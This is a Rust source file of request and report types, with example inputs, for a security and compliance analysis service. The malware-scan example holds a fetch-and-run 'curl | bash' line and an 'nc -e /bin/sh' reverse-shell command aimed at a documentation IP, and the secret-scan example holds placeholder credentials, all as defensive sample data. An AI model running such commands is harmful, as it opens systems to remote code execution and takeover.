use serde::{Deserialize, Serialize};

use crate::{config::SCHEMA_VERSION, standards::all_standard_ids};

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AuditRequest {
    pub request_id: Option<String>,
    pub schema_version: Option<String>,
    pub standard_ids: Option<Vec<String>>,
    pub target: AuditTarget,
    #[serde(default)]
    pub evidence: Vec<EvidenceItem>,
    pub options: Option<AuditOptions>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AuditTarget {
    pub kind: AuditTargetKind,
    pub name: Option<String>,
    pub uri: Option<String>,
    pub repo_url: Option<String>,
    pub git_ref: Option<String>,
    pub inline_text: Option<String>,
    #[serde(default)]
    pub tags: Vec<String>,
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub enum AuditTargetKind {
    Artifact,
    Codebase,
    Network,
    System,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct EvidenceItem {
    pub control_id: String,
    pub standard_id: Option<String>,
    pub description: String,
    pub artifact_ref: Option<String>,
    pub confidence: Option<f64>,
    pub status: Option<EvidenceStatus>,
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub enum EvidenceStatus {
    Observed,
    Gap,
    NotApplicable,
}

#[derive(Debug, Clone, Deserialize, Serialize, Default)]
#[serde(rename_all = "camelCase")]
pub struct AuditOptions {
    pub include_all_controls: Option<bool>,
    pub fail_on_unknown_standards: Option<bool>,
    pub fetch_external_artifact: Option<bool>,
    pub clone_repo: Option<bool>,
    pub max_findings: Option<usize>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DiagramRequest {
    pub request_id: Option<String>,
    pub title: Option<String>,
    #[serde(default)]
    pub terraform: Vec<DiagramSource>,
    #[serde(default)]
    pub gitops: Vec<DiagramSource>,
    #[serde(default)]
    pub live: Vec<DiagramSource>,
    #[serde(default)]
    pub nodes: Vec<InfraNode>,
    #[serde(default)]
    pub edges: Vec<InfraEdge>,
    pub options: Option<DiagramOptions>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DiagramSource {
    pub name: Option<String>,
    pub content: String,
}

#[derive(Debug, Clone, Deserialize, Serialize, Default)]
#[serde(rename_all = "camelCase")]
pub struct DiagramOptions {
    pub include_local_mermaid: Option<bool>,
}

#[derive(Debug, Clone, Deserialize, Serialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "camelCase")]
pub struct InfraNode {
    pub id: String,
    pub label: String,
    pub kind: String,
    pub source: String,
    pub namespace: Option<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InfraEdge {
    pub from: String,
    pub to: String,
    pub label: Option<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DiagramReport {
    pub ok: bool,
    pub request_id: String,
    pub schema_version: String,
    pub title: String,
    pub summary: String,
    pub desired_nodes: Vec<InfraNode>,
    pub live_nodes: Vec<InfraNode>,
    pub edges: Vec<InfraEdge>,
    pub matches: Vec<InfraMatch>,
    pub missing_in_live: Vec<InfraNode>,
    pub unexpected_live: Vec<InfraNode>,
    pub diagrams: Vec<DiagramArtifact>,
    pub generated_at_ms: u128,
    pub notes: Vec<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InfraMatch {
    pub desired_id: String,
    pub live_id: String,
    pub normalized_name: String,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DiagramArtifact {
    pub kind: String,
    pub format: String,
    pub renderer: String,
    pub content: String,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct VulnerabilityScanRequest {
    pub request_id: Option<String>,
    pub title: Option<String>,
    #[serde(default)]
    pub artifacts: Vec<DiagramSource>,
    pub inline_text: Option<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct VulnerabilityScanReport {
    pub ok: bool,
    pub request_id: String,
    pub schema_version: String,
    pub summary: String,
    pub scanned_bytes: usize,
    pub findings: Vec<VulnerabilityFinding>,
    pub generated_at_ms: u128,
    pub notes: Vec<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct VulnerabilityFinding {
    pub id: String,
    pub severity: VulnerabilitySeverity,
    pub category: String,
    pub evidence_ref: String,
    pub message: String,
    pub recommendation: String,
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "camelCase")]
pub enum VulnerabilitySeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

// ---------------------------------------------------------------------------
// Artifact scanners (malware, dependency audit, secret leak detection)
//
// These share a request envelope with the vulnerability scanner: bounded static
// analysis over caller-submitted artifacts and inline text. They never reach out
// to external threat feeds; callers may supply their own indicators/advisories.
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ArtifactScanRequest {
    pub request_id: Option<String>,
    pub title: Option<String>,
    #[serde(default)]
    pub artifacts: Vec<DiagramSource>,
    pub inline_text: Option<String>,
    /// Optional caller-supplied indicators of compromise (hashes, filenames,
    /// signature strings) matched literally against scanned evidence.
    #[serde(default)]
    pub indicators: Vec<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DependencyAuditRequest {
    pub request_id: Option<String>,
    pub title: Option<String>,
    #[serde(default)]
    pub artifacts: Vec<DiagramSource>,
    pub inline_text: Option<String>,
    /// Optional caller-supplied advisories matched against parsed dependencies.
    #[serde(default)]
    pub advisories: Vec<DependencyAdvisory>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DependencyAdvisory {
    pub package: String,
    pub affected_version: Option<String>,
    pub severity: Option<VulnerabilitySeverity>,
    pub advisory: Option<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ArtifactScanReport {
    pub ok: bool,
    pub request_id: String,
    pub scan_type: String,
    pub schema_version: String,
    pub summary: String,
    pub scanned_bytes: usize,
    pub findings: Vec<VulnerabilityFinding>,
    pub generated_at_ms: u128,
    pub notes: Vec<String>,
}

// ---------------------------------------------------------------------------
// Behavioral analyzers (fraud, bot, login anomaly)
//
// These accept batches of structured records and emit per-record risk findings
// plus an aggregate score. All scoring is deterministic and self-contained.
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct FraudDetectionRequest {
    pub request_id: Option<String>,
    pub title: Option<String>,
    #[serde(default)]
    pub events: Vec<FraudEvent>,
    /// Amount above which a transaction is treated as high-value. Defaults to 1000.
    pub high_amount_threshold: Option<f64>,
    #[serde(default)]
    pub blocklisted_ips: Vec<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct FraudEvent {
    pub id: Option<String>,
    pub amount: Option<f64>,
    pub currency: Option<String>,
    pub email: Option<String>,
    pub ip: Option<String>,
    pub ip_country: Option<String>,
    pub billing_country: Option<String>,
    pub card_bin_country: Option<String>,
    pub account_age_days: Option<f64>,
    pub prior_chargebacks: Option<u32>,
    pub timestamp_ms: Option<u128>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct BotDetectionRequest {
    pub request_id: Option<String>,
    pub title: Option<String>,
    #[serde(default)]
    pub events: Vec<BotEvent>,
    /// Requests-per-minute above which traffic is treated as automated. Defaults to 120.
    pub rate_threshold_per_min: Option<f64>,
    #[serde(default)]
    pub honeypot_paths: Vec<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct BotEvent {
    pub id: Option<String>,
    pub ip: Option<String>,
    pub user_agent: Option<String>,
    pub path: Option<String>,
    pub method: Option<String>,
    pub requests_per_min: Option<f64>,
    pub asn_type: Option<String>,
    #[serde(default)]
    pub headers_present: Vec<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LoginAnomalyRequest {
    pub request_id: Option<String>,
    pub title: Option<String>,
    #[serde(default)]
    pub events: Vec<LoginEvent>,
    /// Maximum plausible travel speed in km/h for impossible-travel detection. Defaults to 900.
    pub max_travel_kph: Option<f64>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LoginEvent {
    pub id: Option<String>,
    pub user: Option<String>,
    pub ip: Option<String>,
    pub country: Option<String>,
    pub latitude: Option<f64>,
    pub longitude: Option<f64>,
    pub timestamp_ms: Option<u128>,
    pub success: Option<bool>,
    pub device_id: Option<String>,
    pub mfa_used: Option<bool>,
    pub failed_attempts: Option<u32>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct RiskAnalysisReport {
    pub ok: bool,
    pub request_id: String,
    pub analysis_type: String,
    pub schema_version: String,
    pub summary: String,
    pub events_analyzed: usize,
    pub risk_score: u32,
    pub findings: Vec<RiskFinding>,
    pub generated_at_ms: u128,
    pub notes: Vec<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct RiskFinding {
    pub id: String,
    pub severity: VulnerabilitySeverity,
    pub category: String,
    pub subject_ref: String,
    pub score: u32,
    pub message: String,
    pub recommendation: String,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SystemReportRequest {
    pub request_id: Option<String>,
    pub title: Option<String>,
    pub system_name: Option<String>,
    pub description: Option<String>,
    pub audit: Option<AuditRequest>,
    pub diagram: Option<DiagramRequest>,
    #[serde(default)]
    pub artifacts: Vec<DiagramSource>,
    pub inline_text: Option<String>,
    pub options: Option<SystemReportOptions>,
}

#[derive(Debug, Clone, Deserialize, Serialize, Default)]
#[serde(rename_all = "camelCase")]
pub struct SystemReportOptions {
    pub include_markdown: Option<bool>,
    pub include_pdf: Option<bool>,
    pub include_vulnerability_scan: Option<bool>,
    pub include_diagram: Option<bool>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SystemReport {
    pub ok: bool,
    pub request_id: String,
    pub schema_version: String,
    pub title: String,
    pub markdown: Option<String>,
    pub pdf_base64: Option<String>,
    pub pdf_bytes: Option<usize>,
    pub vulnerability_scan: Option<VulnerabilityScanReport>,
    pub diagram: Option<DiagramReport>,
    pub generated_at_ms: u128,
    pub notes: Vec<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AuditReport {
    pub ok: bool,
    pub request_id: String,
    pub schema_version: String,
    pub target: AuditTarget,
    pub standards: Vec<String>,
    pub score: f64,
    pub status: ComplianceStatus,
    pub summary: String,
    pub standard_results: Vec<StandardResult>,
    pub findings: Vec<Finding>,
    pub collected_artifacts: Vec<CollectedArtifact>,
    pub generated_at_ms: u128,
    pub notes: Vec<String>,
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub enum ComplianceStatus {
    EvidenceCompliant,
    PartiallyCompliant,
    NonCompliant,
    NeedsReview,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct StandardResult {
    pub standard_id: String,
    pub standard_name: String,
    pub category: String,
    pub jurisdiction: String,
    pub score: f64,
    pub status: ComplianceStatus,
    pub controls_total: usize,
    pub controls_satisfied: usize,
    pub controls_needs_evidence: usize,
    pub controls_failed: usize,
    pub control_results: Vec<ControlResult>,
    pub regulatory_notice: String,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ControlResult {
    pub control_id: String,
    pub name: String,
    pub family: String,
    pub status: ControlStatus,
    pub evidence_count: usize,
    pub evidence_refs: Vec<String>,
    pub rationale: String,
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub enum ControlStatus {
    Satisfied,
    NeedsEvidence,
    Failed,
    NotApplicable,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Finding {
    pub severity: FindingSeverity,
    pub standard_id: Option<String>,
    pub control_id: Option<String>,
    pub message: String,
    pub recommendation: String,
    pub evidence_required: Vec<String>,
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
#[allow(dead_code)]
pub enum FindingSeverity {
    Info,
    Warning,
    Error,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct CollectedArtifact {
    pub kind: String,
    pub source: String,
    pub bytes: usize,
    pub scanned_files: usize,
    pub notes: Vec<String>,
}

#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct JobRecord {
    pub id: String,
    pub request_id: String,
    pub status: JobStatus,
    pub created_at_ms: u128,
    pub started_at_ms: Option<u128>,
    pub finished_at_ms: Option<u128>,
    pub result: Option<AuditReport>,
    pub error: Option<String>,
}

#[derive(Debug, Clone, Copy, Deserialize, Serialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "camelCase")]
pub enum JobStatus {
    Queued,
    Running,
    Succeeded,
    Failed,
}

pub fn example_request() -> AuditRequest {
    AuditRequest {
        request_id: Some("example-saas-startup-readiness".to_string()),
        schema_version: Some(SCHEMA_VERSION.to_string()),
        standard_ids: Some(vec![
            "soc-2".to_string(),
            "iso-27001".to_string(),
            "gdpr".to_string(),
            "pci-dss".to_string(),
            "hipaa".to_string(),
            "ccpa".to_string(),
            "fedramp".to_string(),
            "cmmc".to_string(),
        ]),
        target: AuditTarget {
            kind: AuditTargetKind::Codebase,
            name: Some("example-b2b-saas".to_string()),
            uri: None,
            repo_url: None,
            git_ref: None,
            inline_text: Some(
                "Policies: access review, MFA, encryption at rest and in transit, logging, incident response, vendor due diligence, retention and deletion, privacy notice, secure SDLC, vulnerability scanning."
                    .to_string(),
            ),
            tags: vec!["startup".to_string(), "saas".to_string()],
        },
        evidence: vec![
            EvidenceItem {
                control_id: "access_control".to_string(),
                standard_id: None,
                description: "Quarterly access reviews and MFA are enforced for production."
                    .to_string(),
                artifact_ref: Some("iam/access-review-q2".to_string()),
                confidence: Some(0.9),
                status: Some(EvidenceStatus::Observed),
            },
            EvidenceItem {
                control_id: "payment_security".to_string(),
                standard_id: Some("pci-dss".to_string()),
                description: "Card data is tokenized by the payment processor; PAN is not stored."
                    .to_string(),
                artifact_ref: Some("payments/tokenization-design".to_string()),
                confidence: Some(0.8),
                status: Some(EvidenceStatus::Observed),
            },
        ],
        options: Some(AuditOptions {
            include_all_controls: Some(false),
            fail_on_unknown_standards: Some(true),
            fetch_external_artifact: Some(false),
            clone_repo: Some(false),
            max_findings: Some(200),
        }),
    }
}

pub fn schema_example() -> serde_json::Value {
    serde_json::json!({
        "schemaVersion": SCHEMA_VERSION,
        "targetKinds": ["artifact", "codebase", "network", "system"],
        "standardIds": all_standard_ids(),
        "request": {
            "requestId": "string optional",
            "schemaVersion": SCHEMA_VERSION,
            "standardIds": ["soc-2", "iso-27001", "gdpr"],
            "target": {
                "kind": "codebase",
                "name": "string optional",
                "uri": "https://example.com/artifact.json optional",
                "repoUrl": "https://github.com/org/repo.git optional",
                "gitRef": "branch-or-tag optional",
                "inlineText": "operator-supplied evidence or source text optional",
                "tags": ["saas", "prod"]
            },
            "evidence": [{
                "controlId": "access_control",
                "standardId": "soc-2 optional",
                "description": "MFA is enforced for production access.",
                "artifactRef": "iam/report-q2",
                "confidence": 0.9,
                "status": "observed"
            }],
            "options": {
                "includeAllControls": false,
                "failOnUnknownStandards": true,
                "fetchExternalArtifact": false,
                "cloneRepo": false,
                "maxFindings": 200
            }
        }
    })
}

pub fn diagram_example_request() -> DiagramRequest {
    DiagramRequest {
        request_id: Some("example-infra-parity".to_string()),
        title: Some("Terraform vs live runtime".to_string()),
        terraform: vec![DiagramSource {
            name: Some("main.tf".to_string()),
            content: r#"resource "aws_instance" "dd_runtime" {}
resource "aws_security_group" "gateway" {}
"#
            .to_string(),
        }],
        gitops: vec![DiagramSource {
            name: Some(
                "remote/argocd/dd-next-runtime/dd-compliance-rs.deployment.yaml".to_string(),
            ),
            content: "kind: Deployment\nmetadata:\n  name: dd-compliance-rs\n".to_string(),
        }],
        live: vec![DiagramSource {
            name: Some("kubectl get deploy dd-compliance-rs -o yaml".to_string()),
            content:
                "kind: Deployment\nmetadata:\n  name: dd-compliance-rs\n  namespace: default\n"
                    .to_string(),
        }],
        nodes: vec![],
        edges: vec![],
        options: Some(DiagramOptions {
            include_local_mermaid: Some(true),
        }),
    }
}

pub fn vulnerability_scan_example_request() -> VulnerabilityScanRequest {
    VulnerabilityScanRequest {
        request_id: Some("example-vuln-scan".to_string()),
        title: Some("Example static vulnerability scan".to_string()),
        artifacts: vec![DiagramSource {
            name: Some("deployment.yaml".to_string()),
            content: "kind: Deployment\nspec:\n  template:\n    spec:\n      containers:\n        - securityContext:\n            allowPrivilegeEscalation: true\n".to_string(),
        }],
        inline_text: Some("security_group allows 0.0.0.0/0 and tls_insecure = true".to_string()),
    }
}

pub fn malware_scan_example_request() -> ArtifactScanRequest {
    ArtifactScanRequest {
        request_id: Some("example-malware-scan".to_string()),
        title: Some("Example static malware indicator scan".to_string()),
        artifacts: vec![DiagramSource {
            name: Some("suspicious-entrypoint.sh".to_string()),
            content: "#!/bin/sh\ncurl -s http://203.0.113.10/p | bash\nnc -e /bin/sh 203.0.113.10 4444\n".to_string(),
        }],
        inline_text: Some(
            "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*".to_string(),
        ),
        indicators: vec!["203.0.113.10".to_string()],
    }
}

pub fn dependency_audit_example_request() -> DependencyAuditRequest {
    DependencyAuditRequest {
        request_id: Some("example-dependency-audit".to_string()),
        title: Some("Example dependency manifest audit".to_string()),
        artifacts: vec![DiagramSource {
            name: Some("package.json".to_string()),
            content: "{\n  \"dependencies\": {\n    \"express\": \"*\",\n    \"left-pad\": \"latest\",\n    \"internal-lib\": \"git+https://example.com/internal-lib.git\"\n  }\n}\n".to_string(),
        }],
        inline_text: None,
        advisories: vec![DependencyAdvisory {
            package: "express".to_string(),
            affected_version: None,
            severity: Some(VulnerabilitySeverity::High),
            advisory: Some("Example advisory: upgrade to a patched release.".to_string()),
        }],
    }
}

pub fn secret_scan_example_request() -> ArtifactScanRequest {
    ArtifactScanRequest {
        request_id: Some("example-secret-scan".to_string()),
        title: Some("Example secret leak scan".to_string()),
        artifacts: vec![DiagramSource {
            name: Some(".env".to_string()),
            content: "AWS_ACCESS_KEY_ID=AWS_EXAMPLE_ACCESS_KEY_ID\nGITHUB_TOKEN=ghp_examplotokenvalue0000000000000000\n".to_string(),
        }],
        inline_text: Some("postgres://app:hunter2@db.internal:5432/app".to_string()),
        indicators: vec![],
    }
}

pub fn fraud_detection_example_request() -> FraudDetectionRequest {
    FraudDetectionRequest {
        request_id: Some("example-fraud-detection".to_string()),
        title: Some("Example transaction fraud screen".to_string()),
        events: vec![
            FraudEvent {
                id: Some("txn-1".to_string()),
                amount: Some(2400.0),
                currency: Some("USD".to_string()),
                email: Some("buyer@mailinator.com".to_string()),
                ip: Some("198.51.100.7".to_string()),
                ip_country: Some("RU".to_string()),
                billing_country: Some("US".to_string()),
                card_bin_country: Some("US".to_string()),
                account_age_days: Some(0.5),
                prior_chargebacks: Some(1),
                timestamp_ms: Some(1_717_000_000_000),
            },
            FraudEvent {
                id: Some("txn-2".to_string()),
                amount: Some(35.0),
                currency: Some("USD".to_string()),
                email: Some("buyer@mailinator.com".to_string()),
                ip: Some("198.51.100.7".to_string()),
                ip_country: Some("RU".to_string()),
                billing_country: Some("US".to_string()),
                card_bin_country: Some("US".to_string()),
                account_age_days: Some(0.5),
                prior_chargebacks: Some(1),
                timestamp_ms: Some(1_717_000_030_000),
            },
        ],
        high_amount_threshold: Some(1000.0),
        blocklisted_ips: vec![],
    }
}

pub fn bot_detection_example_request() -> BotDetectionRequest {
    BotDetectionRequest {
        request_id: Some("example-bot-detection".to_string()),
        title: Some("Example automated-traffic screen".to_string()),
        events: vec![
            BotEvent {
                id: Some("req-1".to_string()),
                ip: Some("203.0.113.55".to_string()),
                user_agent: Some("python-requests/2.31.0".to_string()),
                path: Some("/login".to_string()),
                method: Some("POST".to_string()),
                requests_per_min: Some(600.0),
                asn_type: Some("hosting".to_string()),
                headers_present: vec!["host".to_string()],
            },
            BotEvent {
                id: Some("req-2".to_string()),
                ip: Some("203.0.113.56".to_string()),
                user_agent: Some("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36".to_string()),
                path: Some("/".to_string()),
                method: Some("GET".to_string()),
                requests_per_min: Some(4.0),
                asn_type: Some("residential".to_string()),
                headers_present: vec!["host".to_string(), "accept".to_string(), "accept-language".to_string()],
            },
        ],
        rate_threshold_per_min: Some(120.0),
        honeypot_paths: vec!["/wp-admin".to_string()],
    }
}

pub fn login_anomaly_example_request() -> LoginAnomalyRequest {
    LoginAnomalyRequest {
        request_id: Some("example-login-anomaly".to_string()),
        title: Some("Example login anomaly screen".to_string()),
        events: vec![
            LoginEvent {
                id: Some("login-1".to_string()),
                user: Some("alice".to_string()),
                ip: Some("198.51.100.10".to_string()),
                country: Some("US".to_string()),
                latitude: Some(40.71),
                longitude: Some(-74.0),
                timestamp_ms: Some(1_717_000_000_000),
                success: Some(true),
                device_id: Some("device-a".to_string()),
                mfa_used: Some(true),
                failed_attempts: Some(0),
            },
            LoginEvent {
                id: Some("login-2".to_string()),
                user: Some("alice".to_string()),
                ip: Some("203.0.113.10".to_string()),
                country: Some("SG".to_string()),
                latitude: Some(1.35),
                longitude: Some(103.8),
                timestamp_ms: Some(1_717_000_600_000),
                success: Some(true),
                device_id: Some("device-z".to_string()),
                mfa_used: Some(false),
                failed_attempts: Some(0),
            },
        ],
        max_travel_kph: Some(900.0),
    }
}

pub fn system_report_example_request() -> SystemReportRequest {
    SystemReportRequest {
        request_id: Some("example-system-report".to_string()),
        title: Some("Example compliance system report".to_string()),
        system_name: Some("dd-next-runtime".to_string()),
        description: Some("Operator-supplied evidence for the runtime cluster.".to_string()),
        audit: None,
        diagram: Some(diagram_example_request()),
        artifacts: vulnerability_scan_example_request().artifacts,
        inline_text: Some(
            "MFA, logging, encryption, incident response, vulnerability scanning.".to_string(),
        ),
        options: Some(SystemReportOptions {
            include_markdown: Some(true),
            include_pdf: Some(true),
            include_vulnerability_scan: Some(true),
            include_diagram: Some(true),
        }),
    }
}
